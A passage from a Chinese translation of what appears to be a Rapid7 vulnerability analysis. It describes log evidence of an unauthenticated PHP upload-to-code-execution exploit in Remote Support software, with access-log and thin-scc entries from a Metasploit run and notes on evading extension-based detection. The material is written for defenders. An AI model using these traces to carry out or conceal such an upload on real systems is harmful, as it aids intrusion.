的安装目录：</span></p><table><thead><tr><th><p><span><strong>日志</strong></span></p></th><th><p><span><strong>如下所示的证据</strong></span></p></th></tr></thead><tbody><tr><td><p><span>httpd_access.log</span></p></td><td><p><span>公共会话创建以及对已上传 PHP 端点的请求</span></p></td></tr><tr><td><p><span>thin-scc.log</span></p></td><td><p><span>原生文件传输流创建和路由错误</span></p></td></tr><tr><td><p><span>thin-scc-errors.log</span></p></td><td><p><span>被拒绝的文件传输请求，包括操作和目标路径</span></p></td></tr><tr><td><p><span>brain.log</span></p></td><td><p><span>包含客户端地址和时间戳的客户连接记录</span></p></td></tr></tbody></table><p><span>活动 worker 还会在 </span><span>$BG_app_root/data/tmp/sdcust_thin_client/&lt;thinMint&gt;/</span><span> 下保存日志；下面的收集详情说明了这些日志如何到达站点日志目录。安装路径因设备而异。</span></p><h3 id=\"sec-11\"><span>对已上传 PHP 端点的请求</span></h3><p><span>仅使用命令的 Metasploit 运行创建了两个公共客户会话，调用其已上传的 PHP 端点，然后检查该端点是否已消失。相关的访问日志行如下：</span></p><pre><code>192.168.1.68 [28/Oct/2026:21:12:23 +0000] \"POST /api/start_session HTTP/1.1\" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]\n192.168.1.68 [28/Oct/2026:21:12:23 +0000] \"POST /api/start_session HTTP/1.1\" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]\n192.168.1.68 [28/Oct/2026:21:12:31 +0000] \"POST /qdgusthrmlirprls HTTP/1.1\" [0s] [Stat:200] [Size:0] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]\n192.168.1.68 [28/Oct/2026:21:12:38 +0000] \"POST /qdgusthrmlirprls HTTP/1.1\" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]\n192.168.1.68 [28/Oct/2026:21:12:43 +0000] \"GET /qdgusthrmlirprls HTTP/1.1\" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]</code></pre><p><span>在这里，</span><span>/qdgusthrmlirprls</span><span> 映射到公共目录中的 </span><span>qdgusthrmlirprls.php</span><span>。第一次 POST 运行命令并返回 200。之后的 POST 是模块的清理请求；GET 则独立检查了该端点。文件自行删除后，两者都收到 404。</span></p><p><span>这为防御人员提供了一个需要调查的序列：创建公共会话，随后请求一个新建且不熟悉的端点，之后可能对同一路径出现 404。仅创建会话属于正常的 Remote Support 活动。仅凭先出现 200、随后出现 404 也不足以判定；应将这些请求与文件变更、会话记录以及任何异常出站连接进行关联分析。</span></p><h3 id=\"sec-12\"><span>URL 可能不包含 .php</span></h3><p><span>之前的 PHP canary 生成了以下日志行：</span></p><pre><code>192.168.1.68 [28/Oct/2026:20:50:07 +0000] \"GET /msfcanary03d80193f0880b.php HTTP/1.1\" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]\n192.168.1.68 [28/Oct/2026:20:50:35 +0000] \"GET /msfcanary03d80193f0880b HTTP/1.1\" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9]\n192.168.1.68 [28/Oct/2026:20:50:35 +0000] \"GET /msfcanary03d80193f0880b HTTP/1.1\" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]</code></pre><p><span>直接请求 </span><span>.php</span><span> 失败，而不带扩展名的请求执行了同一文件。最后的 404 发生在文件自行删除之后。在此示例中，仅搜索以 </span><span>.php</span><span> 结尾的请求的检测会漏掉成功请求。</span></p><p><span>原生传输本身通过客户的 MRS 连接进行。这些访问日志条目显示的是 HTTP 触发器，而非文件内容或伪造的 router ID。捕获的 HTTP 日志未暴露内部 MRS 消息，因此仅凭它无法确定源地址绕过行为。</span></p><h3 id=\"sec-13\"><span>文件和连接</span></h3><p><span>查找站点公共目录下意外的 PHP 文件，以及以 </span><span>.php.n$t</span><span> 结尾的接收文件。中断的传输可能留下临时文件，即使最终 URL 返回 404 也是如此。</span><span>.n$t</span><span> 后缀也属于正常传输实现的一部分，因此需要结合上下文判断其存在是否有意义。</span></p><h3 id=\"sec-14\"><span>原生文件传输痕迹</span></h3><p><span>thin-scc.log</span><span> 和 </span><span>thin-scc-errors.log</span><span> 包含有关文件服务请求的更直接证据。例如，</span><span>thin-scc-errors.log</span><span> 中的这一行给出了操作、原生提供程序和预期的 PHP 目标位置。只有 </span><span>ckey</span><span> 和 </span><span>downloadToken</span><span> 已被隐去：</span></p><pre><code>20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING&gt;DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=&lt;REDACTED&gt;;downloadToken=&lt;REDACTED&gt;;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0</code></pre><p><span>这是我们的阴性对照：该请求使用客户常规的源地址，并被拒绝。它是尝试调用的证据，而非成功上传的证据。伪造的本地源能够通过产生此警告的检查，因此成功利用可能不会留下 </span><span>DISCARDING NONLOCAL MESSAGE</span><span> 条目。</span></p><p><span>成功运行 PHP 模块后，</span><span>thin-scc.log</span><span> 中留下了以下日志行：</span></p><pre><code>20261029 17:06:37    319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO&gt;createStream: connecting to address 1:1129726787:1031\n20261029 17:06:37      2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR&gt;nodeID not found in node list even after renumerating: 0\n20261029 17:06:37      0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR&gt;failed to create a mailbox for sending to: 0:0:0</code></pre><p><span>我们的请求省略了 </span><span>responseAddress</span><span>。处理程序启动传输，然后尝试将其操作响应发送到空地址。这会产生 </span><span>0:0:0</span><span> 错误，但不会阻止文件写入。载荷回调在 </span><span>17:06:37</span><span> 独立确认了执行。</span></p><p><span>在 </span><span>proc{LocalFileTransfer}</span><span> 上下文中查找这种组合，尤其要注意不熟悉的 PHP 请求或出站连接。</span><span>1:1129726787:1031</span><span> 值标识一个内部 MRS 邮箱；客户端 IP 请参阅下方的 brain 连接记录。这些条目本身无法识别写入的文件名，也无法独立证明执行。空地址错误的出现还取决于漏洞利用请求的构造方式；其他实现可能会留下不同的痕迹。</span></p><h3 id=\"sec-15\"><span>Brain 连接记录</span></h3><p><span>brain.log</span><span> 有助于将此活动关联到客户端地址。以下两条记录出现在同一模块运行之前：</span></p><pre><code>20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO&gt;received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0'\n20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO&gt;received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'</code></pre><p><span>这些记录可用于梳理时间线，但客户连接属于正常活动。在捕获的 brain 日志中，我们未发现 </span><span>UploadFiles</span><span> 或 </span><span>DownloadAnonymousFiles</span><span> 操作记录。还出现了通用的 EOF、连接重置和 conference 错误；这些错误范围过于宽泛，不能单独视为漏洞利用指标。</span></p><h3 id=\"sec-16\"><span>收集本机日志的位置</span></h3><p><span>聚合日志位于 </span><span>$BG_app_root/log/</span><span>。当 worker 正在运行时，其自身日志位于 </span><span>$BG_app_root/data/tmp/sdcust_thin_client/&lt;thinMint&gt;/</span><span>。worker 退出时，包装器会将这些日志追加到站点的日志目录，然后清除每 worker 的副本。调查活动会话时，应同时收集这两个位置的日志。</span></p><p><span>捕获的 </span><span>brain.ini</span><span> 和 </span><span>thin-scc.ini</span><span> 均通过 </span><span>enabled=0</span><span> 禁用了调试输出。未捕获到调试日志，我们也未更改日志配置。Brain 的调试配置还将 </span><span>MRS_*</span><span> 类别限制为 </span><span>Info</span><span>，因此仅启用其调试输出并不能保证获得详细的消息载荷。</span></p><p><span>诸如 </span><span>UploadFileStarted</span><span> 和 </span><span>DownloadFileEnded</span><span> 之类的名称出现在本机协议的回调代码中，但我们未在收集到的日志中找到它们。不应将其表述为默认审计事件</span></p>","original","zhKind","translation","complete","漏洞分析","复现","利用链","Rapid7","https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764","Rapid7 CVE 公告",{"_147":148,"_149":-5},"changelogVersion","2026-10-01T08:00","release"]
